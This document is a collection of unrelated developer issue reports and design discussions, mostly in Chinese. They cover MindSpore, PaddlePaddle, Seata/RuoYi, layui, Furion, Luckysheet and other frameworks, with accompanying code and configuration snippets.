【讨论】MindSpore C++接口讨论,"RFC MindSpore C++接口设计讨论 当前MindSpore对外提供的主要是Python接口，希望设计一套端云统一的C++接口。 本文档主要描述MindSpore C++接口的设计和示例。 Trail No. Task Description Related Issue(URL) 1 2 目标 C++接口的用法尽量与Python接口保持一致，降低学习成本。 端云共用一套C++接口，便于代码移植。 功能范围 当前的设计主要面向推理，包括： 支持模型加载 支持权重更新 提供模型推理接口 提供创建算子并构建网络的接口 对外接口 对外涉及以下概念： Operator：提供算子创建、连接等接口。 Operator分为两类：ops和nn，通过命名空间隔离。ops侧重于灵活性，nn侧重于易用性。比如，卷积在ops和nn各有一份实现。 Input/Output：算子的输入和输出，用于描述算子间的连接关系。 Cell：通过继承Cell可以构建网络或网络片段（Function）。 Model：网络模型，提供推理、训练等接口，可以根据已构建的网络或已导出的模型文件来创建Model对象。 Serialization：用于模型、CheckPoint等数据的加载和保存。 Operator 算子接口示例： 算子创建：每个算子提供一个class接口，通过构造函数传入算子的属性。 后续算子的实现代码考虑用工具自动生成（读入算子的配置文件，自动生成算子相关函数、结构体和自动注册代码等。支持value、type、format、shape的推断函数注册）。 算子关系表达：通过算子接口的“()”运算符确定算子间的关系，通过Input和Output描述算子间的关系。 Input: 描述算子的输入，可通过Tensor或Output来构造。 InputList：描述多个输入，多个Input可以组合为InputList，InputList可通过OutputList构造。 Output：描述算子的第几个输出。 OutputList：多输出的算子返回OutputList。 支持动态图：有二种处理方式（优先级低，待讨论） 提供Print等算子，Print等算子内部将所依赖的算子整合为Graph，并编译执行，最后输出计算结果。 Output提供Value函数，Value函数返回算子的执行结果（Tensor）。Value函数内部构建图并编译执行。 卷积提供mindspore::nn::Conv2d和mindspore::ops::Conv2D二套接口。其中mindspore.ops.Conv2D的C++接口定义如下： 示例1（基本场景）： 示例2（动态输入）： 示例3（动态输出）： Cell Cell接口： Cell是网络的基本组成单元，算子和网络都是Cell的具体实现。 Cell可以认为是一个单独的网络，可以直接推理或训练；也可以像算子一样与其他算子构成更复杂的网络。 对外提供2个默认的operator()接口，用于连接Cell和其他算子。子类可根据具体场景提供不同参数的operator()接口。 子类需要通过构造函数和Construct函数来扩展功能，Construct会被operator()接口自动调用。 示例1（通过继承Cell构建网络） 示例2（将常用的算子组合封装为Function）： 示例3（条件控制）： 示例4（PyNative模式：通过Print算子打印中间结果）： 示例5（PyNative模式：通过Value()函数获取计算结果）： Model TODO: mindspore.train.model.Model训练相关的参数（loss_fn、optimizer、metrics、eval_network等）如何传入Model？通过构造函数传入？ Serialization 下一步工作 规划目录结构、命名空间。 细化Context/Options、Status、Tensor等数据结构。 兼容端侧的C++接口。 讨论细化PyNative场景和接口。 当前主要侧重推理，需要分析和细化训练场景和接口。 适配MindData接口。 设计对外的C接口。 端到端示例 构建LeNet网络 加载模型并推理 迁移学习 构建网络并训练 导出模型 增量训练 内部实现 构图接口 对外只暴露算子的接口类，编译时转换为基于PrimitiveC的算子对象，并构造FuncGraph。 工具 编写Python脚本，实现C++接口自动生成和Python模型转换为C++模型。 C++接口自动生成 Python脚本导入MindSpore： 获取nn下的算子列表： 遍历算子列表，对于每个算子（也可使用inspect模块）： 获取算子的参数名称： 获取算子的默认参数值：``mindspore.nn.AvgPool21d.init.defaults` 解析算子注释，确定每个参数的数据类型 使用jinja2自动生成代码 Python模型转换为C++模型 导入Python脚本，将Python代码转换为AST 遍历AST，基于AST生成C++代码 对于不支持的Python语法，生成TODO代码，由用户手动修改   <code>: class MatMul { public: Output operator()(Input x1, Input x2); }; class Concat { public: Concat(int axis = 0); // InputList表明输入是可变的 Output operator()(InputList inputs); void SetAxis(int axis); int GetAxis(); }; class Split { public: Split(int axis = 0, int output_num = 1); // OutputList表明输出是可变的 OutputList operator()(Input x); void SetAxis(int axis); int GetAxis(); void SetOutputNum(int output_num); int GetOutputNum(); }; // 控制依赖 class ControlDepend { public: ControlDepend(int depend_mode = 0); Output operator()(Input src, Input dst); }; class If { public: // inputs作为then_branch和else_branch的输入 OutputList operator()(Input cond, InputList inputs, Input then_branch, Input else_branch); }; class While { public: // inputs作为cond和body的输入 OutputList operator()(InputList inputs, Input cond, Input body); }; class For { public: // inputs作为body的输入 OutputList operator()(Input start, Input limit, Input delta, InputList inputs, Input body); }; class Conv2D { // 对应mindspore.ops.Conv2D public: Conv2D(); Conv2D(int out_channel, const std::vector&lt;int&gt; &amp;kernel_size, int mode = 1, const std::string &amp;pad_mode = ""valid"", const std::vector&lt;int&gt; &amp;pad = {0, 0, 0, 0}, const std::vector&lt;int&gt; &amp;stride = {1, 1, 1, 1}, const std::vector&lt;int&gt; &amp;dilation = {1, 1, 1, 1}, int group = 1); Output operator()(Input input, Input filter); ... Set/Get接口 ... }; // 构建包含Tensor、Sub和ReLU的图，算子间通过Output连接 Tensor a(float32, ...); Tensor b(float32, ...); Sub sub; ReLU relu; Output result1 = relu(sub(a, b)); Tensor c(float32, ...); Tensor d(float32, ...); Output result2 = ReLU()(Sub()(c, d)); // 支持算子对象的构造与连接写在一行 Tensor a(...); Tensor b(...); Neg neg1, neg2; Concat concat = Concat(); Output c = concat({neg1(a), neg2(b)}); Tensor a(...); Split split(0, 2); Add add; OutputList outputs = split(a); Output b = add(outputs[0], outputs[1]); class Cell { public: Cell(); // operator()内部调用Construct函数， // 并将Function内部的算子打上func属性，后续据此属性构造独立的FuncGraph OutputList operator()(Input input); OutputList operator()(InputList inputs); protected: virtual OutputList Construct(const InputList &amp;inputs) = 0; }; class MyNet : public Cell { public: MyNet(...) { conv_ = Conv2d(...); conv_.SetStride({ 1, 1, 1, 1 }) relu_ = ReLU(); } protected: OutputList Construct(const InputList &amp;inputs) override { Output a = conv_(intpus[0], inputs[1]); Output b = relu_(a); return {b}; } private: Conv2d conv_; ReLU relu_; }; MyNet net; Model model(net); class MyFunc : public Cell { public: MyFunc() { conv_ = Conv2d(...); relu_ = ReLU(); } protected: OutputList Construct(const InputList &amp;inputs) override { Output a = conv_(intpus[0], inputs[1]); Output b = relu_(a); return {b}; } private: Conv2d conv_; ReLU relu_; }; Tensor a(...); MyFunc func; ReLU relu; Output result = relu(func(a)[0]); class ThenBranch : public Cell { protected: OutputList Construct(const InputList &amp;inputs) override; }; class ElseBranch : public Cell { protected: OutputList Construct(const InputList &amp;inputs) override; }; ThenBranch then_branch; ElseBranch else_branch; If my_if = If; OutputList outputs = my_if(cond, inputs, then_branch, else_branch); Output result = ReLU(outputs[0]); ReLU relu; Output b = relu(a); // Print算子内部自动编译relu算子 Print(b); ReLU relu; Output b = relu(a); // Value()内部自动编译relu算子 Tensor tensor = b.Value()); cout &lt;&lt; ""relu result: "" &lt;&lt; tensor &lt;&lt; endl; // 模型类型 enum ModelType { MINDIR, AIR, ONNX }; class Model { public: using Options = map&lt;string, string&gt;; // options相当于Python的mindspore.context // 通过options可以指定AIPP的配置文件、动态dims支持的batch/height/width等 Model(const Options &amp;options); // 加载已有模型的场景 // 使用算子构图的场景 Model(Cell &amp;network, const Options &amp;options); Model(InputList inputs, const Options &amp;options); // 加载&amp;卸载模型 Status Load(const string &amp;model_file, ModelType model_type); Status Load(const Buffer &amp;model_data, ModelType model_type); Status Unload(); // TODO: // 1. 是否必要传入callbacks？训练和Lite接口支持callback，需要继续分析 // 2. 需要梳理训练、验证、推理特有的配置项？确认这些选项从哪个接口传入 // 3. 数据使用Buffer是否足够，为什么Serving接口需要使用Tensor？ Status Train(Dataset &amp;dataset, map&lt;string, Buffer&gt; &amp;outputs); Status Eval(Dataset &amp;dataset, map&lt;string, Buffer&gt; &amp;outputs); Status Predict(const vector&lt;Buffer&gt; &amp;inputs, vector&lt;Buffer&gt; &amp;outputs); // 针对一个业务流程使用多个模型进行推理的场景（模型连跑），该接口可以在模型间复用数据 // 多个Buffer可以关联同一块host和device内存，推理过程中若发现device内存已分配则不再重新分配 static Status Predict(vector&lt;Model*&gt; &amp;models, vector&lt;pair&lt;vector&lt;Buffer&gt;, vector&lt;Buffer&gt;&gt;&gt; &amp;inouts); // 辅助接口，待扩展 Status GetInputInfo(std::vector&lt;InputInfo&gt; &amp;infos); Status GetOutputInfo(std::vector&lt;OutputInfo&gt; &amp;infos); }; class Serialization { // Checkpoint相关接口，主要是读取和设置权重数据 // TODO: 是否需要支持保存Checkpoint？需要与callback一起考虑 static Status LoadCheckpoint(const string &amp;ckpt_file, map&lt;string, Buffer&gt; &amp;parameters); static Status SetParameters(const map&lt;string, Buffer&gt; &amp;parameters, Network &amp;network); static Status SetParameters(const map&lt;string, Buffer&gt; &amp;parameters, Model &amp;model); // MindIR格式加载后可以导出为AIR和ONNX，但AIR和ONNX导入后暂不支持导出为其他格式 // 读取和导出模型数据（支持MINDIR等格式） // TODO: 是否需要冻结指定的层？ // 由于网络输入结点无shape、data type等信息，所以export接口需要传入inputs static Status ExportModel(const Model &amp;model, ModelType type, Buffer &amp;model_data, vector&lt;Tensor&gt; inputs); static Status ExportModel(const Model &amp;model, ModelType type, const std::string &amp;file, vector&lt;Tensor&gt; inputs); }; class LeNet : public Cell&lt;LeNet&gt; { public: LeNet(int num_channel) : Cell() { conv1_ = Conv2D(6, {5, 5}); conv1_weight_ = Tensor(""conv1_weight"", DataType::kMsFloat32, {1, num_channel, 5, 5}, std::vector&lt;float&gt;(1 * num_channel * 5 * 5, 0).data(), 1 * num_channel * 5 * 5 * sizeof(float)); conv2_ = Conv2D(16, {5, 5}); conv2_weight_ = Tensor(""conv2_weight"", DataType::kMsFloat32, {1, 6, 5, 5}, std::vector&lt;float&gt;(1 * 6 * 5 * 5, 0).data(), 1 * 6 * 5 * 5 * sizeof(float)); relu_ = ReLU(); avg_pool_ = AvgPool({2, 2}, {2, 2}); reshape_ = ReShape(); fc1_ = Dense(); fc2_ = Dense(); fc3_ = Dense(); } OutputList Construct(const InputList &amp;inputs) override { Output x = conv1_(inputs[0], conv1_weight_); x = avg_pool_(relu_(x)); x = conv2_(x, conv2_weight_); x = avg_pool_(relu_(x)); x = reshape_(x); x = relu_(fc1_(x)); x = relu_(fc2_(x)); x = fc3_(x); return {x}; } private: Conv2D conv1_; Tensor conv1_weight_; Conv2D conv2_; Tensor conv2_weight_; ReLU relu_; AvgPool avg_pool_; ReShape reshape_; Dense fc1_; Dense fc2_; Dense fc3_; }; Model model(context); model.Load(model_file, MINDIR, options); vector&lt;Buffer&gt; inputs = ...; model.Predict(inputs, outputs); Network resnet = ResNet50(); map&lt;string, Buffer&gt; parameters; // 从Checkpoint文件加载权重数据 Serialization::LoadCheckpoint(""resnet50-2_32.ckpt"", parameters); // 将权重数据设置导ResNet网络 Serialization::SetParameters(parameters, resnet); Momentum opt; Serialization::SetParameters(parameters, opt); SoftmaxCrossEntropyWithLogits loss; Model model(options, resnet, loss, opt); // TODO: loss, opt的传入方式待讨论 model.train(epoch, dataset); import mindspore dir(mindspore.nn) mindspore.nn.AvgPool21d.__init__.__code__.code_var_varnames"
1.17.5版本suagger 无法生成swagger.json,"Furion 版本号 1.17.5 Web 项目类型 WebApi 发生了什么？ 当我在使用 和 的时候swagger.json 并没有生成成功（因考虑到其他原因，项目中并未使用动态接口，而是创建的Controller,） 而当我使用Swagger自带的方法生成的时候 是可以生成的swagger.json的,但是在这个状态下如果使用 方法的话 swagger.json 则又生成不出来。 不知道为什么会是这个情况 代码或代码仓库 如果是我使用错误的话，请不吝指教一下。   <code>: services.AddControllers(); services.AddInject(); app.UseInject(); services.AddControllers(); services.AddSpecificationDocuments(); app.UseSpecificationDocuments(); services.AddSwaggerGen(c =&gt; { c.SwaggerDoc(""v1"", new OpenApiInfo() { Title = ""My API"", Version = ""v1"" }); //启用中文注释功能 var basePath = AppContext.BaseDirectory; var xmlPath = Path.Combine(basePath, ""DHCLF.API.xml""); c.IncludeXmlComments(xmlPath); }); app.UseSwagger(); app.UseSwaggerUI(c =&gt; { //c.InjectJavascript(""""); c.SwaggerEndpoint(""/swagger/v1/swagger.json"", ""My API V1""); }) //就是统一返回值模型 .AddInjectWithUnifyResult&lt;RESTfulResultProvider&gt;();"
分布式事务不起作用,"根据文档配置了分布式事务，不起作用。请大家看一下，配置是否正确。 projecta 通过feign调用 projectb。在projectb中抛出异常，projecta中的没有回滚。 1、config.txt文件，注意根据ry的要求，配置两个vgroupMaspping 2、project-txa在nacos上的配置如下 按ry要求，spring.datasource.dynamic.seata:true seata.enable:true 并修改vgroup-mapping为project-txa-group。 3、调用代码 根据ry要求，在开始调用的service中添加@GlobalTransaction，并在被调用方@Transaction中使用REQUEIS_NEW 4、被调用的Controller及service service: 经过，测试，当输入的名称里面包J时，即会抛出RuntimeException，但事务并不会回滚。 如果写成功，可以看到事务的id一致，但如果不成功，事务不回滚。大家可以看一下，以下事务id相同时写入成功，但抛出异常时，还是写入一行成功。即全局事务没有工作。 mysql&gt; select * from teacher;select * from person; +---------------------+--------------------------------------------------+------+ | id | name | age | +---------------------+--------------------------------------------------+------+ | 1377810645660504066 | 192.168.56.1:8091:121196222076686336:true#Jerry | 44 | | 1377812358412931073 | 192.168.56.1:8091:121197934749421568:true#成功的 | 44 | +---------------------+--------------------------------------------------+------+ 2 rows in set (0.00 sec) +---------------------+-----------------------------------------------------+------+ | id | name | age | +---------------------+-----------------------------------------------------+------+ | 1377812358459060226 | 192.168.56.1:8091:121197934749421568:AT:true#成功的 | 44 | +---------------------+-----------------------------------------------------+------+ 1 row in set (0.00 sec)   <code>: service.vgroupMapping.project-txb-group=default store.mode=db store.db.datasource=druid store.db.dbType=mysql store.db.driverClassName=com.mysql.cj.jdbc.Driver store.db.url=jdbc:mysql://127.0.0.1:3306/local_ry?useUnicode=true store.db.user=root store.db.password=123456 store.db.minConn=5 store.db.maxConn=30 store.db.globalTable=global_table store.db.branchTable=branch_table store.db.queryLimit=100 store.db.lockTable=lock_table store.db.maxWait=5000 spring: redis: host: localhost port: 6379 password: datasource: druid: stat-view-servlet: enabled: true loginUsername: admin loginPassword: 123456 dynamic: seata: true druid: initial-size: 5 min-idle: 5 maxActive: 20 maxWait: 60000 timeBetweenEvictionRunsMillis: 60000 minEvictableIdleTimeMillis: 300000 validationQuery: SELECT 1 FROM DUAL testWhileIdle: true testOnBorrow: false testOnReturn: false poolPreparedStatements: true maxPoolPreparedStatementPerConnectionSize: 20 filters: stat,wall,slf4j connectionProperties: druid.stat.mergeSql\=true;druid.stat.slowSqlMillis\=5000 datasource: # 主库数据源 master: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://localhost:3306/local_ry?characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai username: root password: 123456 # seata配置 seata: # 默认关闭，如需启用spring.datasource.dynami.seata需要同时开启 enabled: true # Seata 应用编号，默认为 ${spring.application.name} application-id: ${spring.application.name} # Seata 事务组编号，用于 TC 集群名 tx-service-group: ${spring.application.name}-group # 关闭自动代理 enable-auto-data-source-proxy: false # 服务配置项 service: # 虚拟组和分组的映射 vgroup-mapping: project-txa-group: default grouplist: default: 127.0.0.1:8091 config: type: nacos nacos: serverAddr: 127.0.0.1:8848 group: SEATA_GROUP namespace: username: nacos password: nacos registry: type: nacos nacos: application: seata-server server-addr: 127.0.0.1:8848 namespace: username: nacos password: nacos # mybatis配置 mybatis: # 搜索指定包别名 typeAliasesPackage: com.tx.domain # 配置mapper的扫描，找到所有的mapper.xml映射文件 mapperLocations: classpath:com/tx/mapper/*Mapper.xml # swagger配置 swagger: title: 系统模块接口文档 license: Powered By ruoyi licenseUrl: https://ruoyi.vip package com.tx.api.teacher.service; import com.baomidou.dynamic.datasource.annotation.DS; import com.ruoyi.common.core.web.domain.AjaxResult; import com.tx.api.teacher.domain.Teacher; import com.tx.api.teacher.mapper.TeacherMapper; import com.tx.feign.ProjectTwoFeign; import io.micrometer.core.instrument.util.JsonUtils; import io.seata.core.context.RootContext; import io.seata.spring.annotation.GlobalTransactional; import lombok.extern.slf4j.Slf4j; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import org.springframework.transaction.annotation.Propagation; import org.springframework.transaction.annotation.Transactional; import java.util.Random; /** * @author admin */ @Slf4j @Service public class TeacherService { @Autowired private TeacherMapper teacherMapper; /** * 注入Feign */ @Autowired private ProjectTwoFeign projectTwoFeign; /** * 根据ry的要求，每一个service的调用方法上者写了@DS(..) * @param teacher 接收 * @return 写入数量 */ @DS(""master"") @GlobalTransactional @Transactional(rollbackFor = Exception.class) public int save(Teacher teacher) { //获取事务ID String xid = RootContext.getXID(); boolean boo = RootContext.inGlobalTransaction(); String str = xid + "":"" + boo; // 将事务ID也写入到表中 teacher.setName(str + ""#"" + teacher.getName()); int insert = teacherMapper.insert(teacher); int a = new Random().nextInt(100); log.info(""Teacher写入成功:"" + a + "","" + insert); //开始调用feign AjaxResult ajaxResult = projectTwoFeign.save(teacher.getName().split(""#"")[1], teacher.getAge()); log.info(""调用的结果为："" + ajaxResult.toString()); return insert; } } package com.tx.api.person.controller; import com.ruoyi.common.core.web.domain.AjaxResult; import com.tx.api.person.domain.Person; import com.tx.api.person.service.PersonService; import lombok.extern.slf4j.Slf4j; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; /** * @author admin */ @Slf4j @RestController @RequestMapping(""person"") public class PersonController { private final PersonService personService; public PersonController(PersonService personService) { this.personService = personService; } @PostMapping(""save"") public AjaxResult save(Person person) throws Exception{ log.info(""开始保存person""); int save = personService.save(person); if (save &gt; 0) { return AjaxResult.success(); } else { return AjaxResult.error(); } } } package com.tx.api.person.service; import com.baomidou.dynamic.datasource.annotation.DS; import com.tx.api.person.domain.Person; import com.tx.api.person.mapper.PersonMapper; import io.seata.core.context.RootContext; import io.seata.spring.annotation.GlobalTransactional; import io.seata.tm.api.GlobalTransactionContext; import lombok.extern.slf4j.Slf4j; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import org.springframework.transaction.annotation.Propagation; import org.springframework.transaction.annotation.Transactional; import java.util.Random; /** * @author admin */ @Slf4j @Service public class PersonService { @Autowired private PersonMapper personMapper; @DS(""master"") @Transactional(rollbackFor = Exception.class, propagation = Propagation.REQUIRES_NEW) public int save(Person person) throws Exception { String xid = RootContext.getXID(); String branchType = RootContext.getBranchType(); boolean boo = RootContext.inGlobalTransaction(); String tx = xid + "":"" + branchType + "":"" + boo + ""#""; log.info(""tx is:{}"", tx); person.setName(tx + person.getName()); int a = personMapper.insert(person); log.info(""save person success:"" + a); if (person.getName().contains(""J"")) { // 添加此句后，将会回滚，但如果不添加，将不会自动回滚 // GlobalTransactionContext.reload(xid).rollback(); throw new RuntimeException(""包含有J直接抛出异常""); } return a; } }"
"版本2.10.0, 子表单beforeOpen赋值Vue报错","` beforeOpen(done, type) { //如果打开窗口的类型为‘新增’ if ([""add""].includes(type)) { }, `   <code>: } if ([""edit"", ""view""].includes(type)) { const that = this; request({ url: '/demo/table/get', method: 'get', params: {id: that.form.id} }).then(res =&gt; { that.form = res.data; if (that.form.fields) { let fields = JSON.parse(that.form.fields); that.form.fields = []; // 这里换过for in, for i 都不行 fields.forEach((item, index) =&gt; { that.form.fields.push({ field: item.field }); }) } }) } done();"
MKLDNN changes global linker flags with shared library.,"When is true, changes linker flags to link for all executors and shared libraries. But some of Paddle executors and libraries (especially executors and shared libraries when refactoring) do not need and do not depend on it. So we should change the to make targets who use to link it. How to reproduce this issue. In Linux system, add cmake flag , and make any binary or shared library which does not depends on will trigger this error. Like Error line of code https://github.com/PaddlePaddle/Paddle/blob/develop/cmake/configure.cmake#L77   <code>: WITH_MKLDNN configure.cmake -liomp MKLDNN configure.cmake iomp WITH_MKLDNN=ON MKLDNN cmake .. -DWITH_MKLDNN=ON make paddle_pybind"
多线程下RecordIO的reader进行reset操作后无法读取数据,"train_exe = fluid.ParallelExecutor( use_cuda=False, loss_name=train_avg_loss.name, main_program=train_program) test_exe = fluid.ParallelExecutor( use_cuda=False, main_program=test_program, share_vars_from=train_exe)   <code>: for epoch in xrange(100): try: while True: train_loss_v = train_exe.run(return_numpy=False, fetch_list=[train_loss.name]) except fluid.core.EOFException: # 触发了EOFException以后似乎还有线程没有完成训练。 train_reader.reset() #这里reset后在下一个epoch没有读入任何数据。 try: while True: test_loss_v = test_exe.run(return_numpy=False, fetch_list=[test_loss.name]) except paddle.fluid.core.EOFException: test_reader.reset()"
"如果HTML写在<script type=""text/html"" id=""demo""><div id=""demoXmSelect"" style=""max-width: 200px;""></div></script>这里面，应该如何渲染呢？","如果占位DOM写在script里。如下： 应该如何渲染呢？ // 渲染多选下拉 var ss = xmSelect.render({ el: '#demoXmSelect', data: [ {name: '系统管理员', value: 1}, {name: '报表管理员', value: 2}, {name: '财务部', value: 3}, {name: '财务部1', value: 4}, {name: '财务部2', value: 5}, ] }); 这样渲染无效。怎么回事？   <code>: &lt;script type=""text/html"" id=""demo""&gt;&lt;div id=""demoXmSelect"" style=""max-width: 200px;""&gt;&lt;/div&gt;&lt;/script&gt;"
【众智】【计算-GPU开发】RandomPoissonV2,RandomPoissonV2 从由速率描述的泊松分布中输出随机值。 接口目录：mindspore/ops/operations/random_ops.py 参数 类型 输入/输出/属性 说明 shape rate y seed int 属性 seed2 int 属性 dtype type 属性 对应底层算子 对应底层算子RandomPoisson 无反向   <code>: class RandomPoisson(Primitive):
benchmark model continuous evaluation (Model CI) ,"Currently, we have five benchmark models. In my mind, the model integration job needs to collect indicators in three aspects: model evaluation(i.e. loss, accuracy), speed and memory cost. For our regression test, we only need to run several batches(say 100 batches) when the training process is stable, then the speed and memory cost data are collected. We also can compare the first several batch losses to validate the model evaluation is correct. There some problems need to be discussed. The GPU/CUDA Version difference Should we consider the different GPU/CUDA machine in regression test? Given a model and a fixed dataset, then some metrics are not changed when you change the training machine and some are changed. For instance, the loss and accuracy regression curves are fixed, but the speed and memory cost will be changed if you use the different version of CUDA and GPU. Our numbers on make no sense on other version GPUs. The mini batches size difference For the online learning job or saving training resource, they need small batch size in training models. But for the training speed, they may need big batch size. And the convergence curve is different and the training speed cannot be referenced. The different batch size is needed in the regression test. The training/inference difference Currently, most users care more about the inference performance, because online service needs to ensure the performance. The inference is totally different with the training phase, the training and inference phase different must be considered in regression test. To guard our most urgent 5.1, so migrating the high valued models first. vgg GPU model CE resnet GPU model CE   <code>: Pascal architecture GPU"
Check and only check the output varibles specified by self.outputs,"很多中都会用到一些变量，它们被声明为类型。根据输入的情况不同，有些变量实际不会被用到，比如在中： 当输入变量和包含多组数据时，计算的过程为 此时需要用到和两个变量。 当输入变量和只包含一组数据时，计算的过程为 此时，我们不再需要使用。 因此在单测中，这些不被用到的变量应该允许不指定，并且不进行检查。 单测中，的输入输出都通过和指定。在创建的变量时，会遍历当前的中所指定的变量，如果这些变量被和指定了，则创建对应的。 因此，在取校对结果时，也需要检查是否被，因为没有被指定的变量，很有可能是不需要的变量。至于计算实际需要，但是没有在中指定的变量，则应由实现的C++代码实现检查和报错。   <code>: Operator 中间输出 AsIntermediate() 中间输出 FCOp X W MulOut[i] = X[i] * W[i] SumOut = MulOut[0] + ... + MulOut[n-1] MulOut SumOut 中间输出 X W MulOut[0] = X[0] * W[0] SumOut 中间输出 Op self.inputs self.outputs Op 输入输出 Op Proto 输入输出 self.inputs self.outputs Variable for out_name, out_dup in Operator.get_op_outputs(op_type): if out_name in outputs: kwargs[out_name] = [] if out_dup: sub_out = outputs[out_name] for sub_out_name, _ in sub_out: var = scope.new_var(sub_out_name) kwargs[out_name].append(sub_out_name) else: var = scope.new_var(out_name) kwargs[out_name].append(out_name) 输出变量 输出变量 self.outputs self.outputs 中间输出 Op self.outputs Op"
[CT][MS] 内置函数max/min 对变量Tensor 支持的情况 和文档有出入,"具体对象涉及 /mode graph   <code>: @ms_function() def foo(x): return min(x),max(x) @ms_function() def foo(x,y): return min(x,y),max(x,y) `` ### Steps to reproduce the issue / 重现步骤 (Mandatory / 必填) 1. 执行用例 2. 3. ### Describe the expected behavior / 预期结果 (Mandatory / 必填) / ### Related log / screenshot / 日志 / 截图 (Mandatory / 必填) / ### Special notes for this issue/备注 (Optional / 选填)"
upms模块启动时经常有数据库连接池启动异常的情况,"pigx版本: 3.0 操作系统: windows 是否修改包名: 是 com.zaxxer.hikari.pool.ProxyConnection : MyHikariCP-2 - Connection com.mysql.cj.jdbc.ConnectionImpl@58c22e3b marked as broken because of SQLSTATE(08003), ErrorCode(0) java.sql.SQLNonTransientConnectionException: Connection is closed.   <code>: upms模块启动时经常有数据库连接池启动异常的情况，在修改配置中心并发布相关配置之后，upms模块重新启动就会有问题，之前在群里面有人说要在模块数据源中加上相关配置，也添加上去了，但是问题依旧。请麻烦冷总，帮忙定位一下，谢谢。"
日志模块除了登录请求其余任何请求mybatis自动填充的username都为anonymousUser,pig版本: 3.6.2 是否修改包名: 否   <code>: UserCOntroller getUserPage方法 增加SysLog注解保存日志，MybatisPlusMetaObjectHandler的getUserName()方法获取到的都是anonymousUser
update the link of doc.paddlepaddle.org in README.md,"should be updated to   <code>: doc.paddlepaddle.org http://www.paddlepaddle.org/docs/ grep -rn ""doc.paddlepaddle.org"" * README.md:64:[Docker installation guide](http://doc.paddlepaddle.org/develop/doc/getstarted/build_and_install/docker_install_en.html) README.md:66:[build from source guide](http://doc.paddlepaddle.org/develop/doc/getstarted/build_and_install/build_from_source_en.html). README.md:70:We provide [English](http://doc.paddlepaddle.org/develop/doc/) and README.md:71:[Chinese](http://doc.paddlepaddle.org/doc_cn/) documentation. README.md:77:- [Distributed Training](http://doc.paddlepaddle.org/develop/doc/howto/usage/cluster/cluster_train_en.html) README.md:81:- [Distributed Training on Kubernetes](http://doc.paddlepaddle.org/develop/doc/howto/usage/k8s/k8s_en.html) README.md:85:- [Python API](http://doc.paddlepaddle.org/develop/doc/api/index_en.html) README.md:89:- [How to Contribute](http://doc.paddlepaddle.org/develop/doc/howto/dev/contribute_to_paddle_en.html)"
我修改了 AjaxResult 返回的字段名 导致前端弹窗无法正常进行提示,"之前： /** 状态码 */ public static final String CODE_TAG = ""code""; 修改后： 前端需要 错误的弹窗 都修改为 message吗。前端有统一的修改地方吗， 我直接 全局搜索了一下msg 太多文件了。 不确定改那个， 希望大佬给与提示   <code>: /** 返回内容 */ public static final String MSG_TAG = ""msg""; /** 数据对象 */ public static final String DATA_TAG = ""data""; /** 状态码 */ public static final String CODE_TAG = ""code""; /** 返回内容 */ public static final String MSG_TAG = ""message""; /** 数据对象 */ public static final String DATA_TAG = ""result"";"
fluid.save接口的参数命名有歧义，使用不方便,"欢迎您对PaddlePaddle提出建议，非常感谢您对PaddlePaddle的贡献！ 在留下您的建议时，辛苦您同步提供如下信息： 版本、环境信息 1）PaddlePaddle版本：1.7 2）CPU/GPU：CPU 3）系统环境：CentOS 在使用fluid.save接口时，该接口的参数为， 假如传入model_path为，用户会直观认为模型保存结果如下，然而事实上，保存结果为。 如果训练多个epoch，path下会出现一大堆文件，与paddle其他保存模型的接口表现不一致。 为了达到保存为的效果，用户除了必须手动创建文件夹外，需传入model_path=""/path/epoch_1"" + ""/"" + ""checkpoint""，才能保存为预期的形式，不方便用户使用与迁移。 因为很多训练多轮的场景save&amp;load都是通过迭代文件夹实现的，现在会直接报错。给用户增加了很多迁移的成本。 希望能够针对这个api进行易用性优化。   <code>: def save(program, model_path): /path/epoch_1 /path/epoch_1/model_file /path/epoch_1_model_file /path/epoch_1/model_file /epoch_1"
form表单name多层级问题,"使用layui表单，当涉及多层级name时，在提交时通过data.field获取表单字段数据框架会处理成xxx[xxx][xxx]:value的形式，但有时我们需要的形式是{xxx:{xxx:{xxx:value}}}的对象形式。 实例代码如下： 返回数据如下： 期望数据如下： 通过查看 https://gitee.com/sentsin/layui/blob/master/src/modules/form.js 源码第125行左右可以看到数组name的支持仅限于name=""xxx[]""的形式，自动添加数字ID 临时解决方案： 在拿到data.field后遍历进行处理 实现方案：   <code>: &lt;form class=""layui-form"" action="""" lay-filter=""setting-form""&gt; &lt;input type=""text"" name=""setting[aaa][bbb]"" value=""333"" /&gt; &lt;button class=""layui-btn"" lay-submit lay-filter=""setting-form""&gt;确定&lt;/button&gt; &lt;/form&gt; &lt;script type=""text/javascript""&gt; layui.form.on('submit(setting-form)', function(data){ console.log('表单数据：', data.field); })； &lt;/script&gt; setting[aaa][bbb]:333 { setting: { aaa: { bbb: 333 } } } layui.form.on('submit(setting-form)', function(data){ // layer.msg(JSON.stringify(data.field)); // console.log('表单数据：', data.field); var fieldData = {}; layui.each(data.field, function(field_k, field_v) { if (/^.*\[.*\]/.test(field_k)) { // 匹配[xxx]则认为是数组name // 替换""]""后按""[""分割成数组 field_k = (field_k.replace(/\]/g, '')).split(/\[/); // 定义一个临时变量 var tempValue = {}; // 倒序循环 for (var i= field_k.length - 1; i &gt;= 0; i--) { if (i == field_k.length - 1) { // 最终值 tempValue[field_k[i]] = field_v; } else { // 父对象 var _tempValue = {}; _tempValue[field_k[i]] = tempValue; tempValue = _tempValue; } } // 拷贝合并到字段值 fieldData = layui.$.extend(true, fieldData, tempValue); } else { fieldData[field_k] = field_v; } }); // console.log('处理数据：', fieldData); });"
2.1.13 报错,luckysheet version: 2.1.13 报错 luckysheet version: 2.0.6 正常   <code>: sheetmanage.js:1088 Uncaught (in promise) TypeError: Cannot read properties of undefined (reading '1') at Object.mergeCalculation (sheetmanage.js:1088) at b (sheetmanage.js:829) at y (sheetmanage.js:914) at sheetmanage.js:963 at server.js:1369 at plugin.js:1
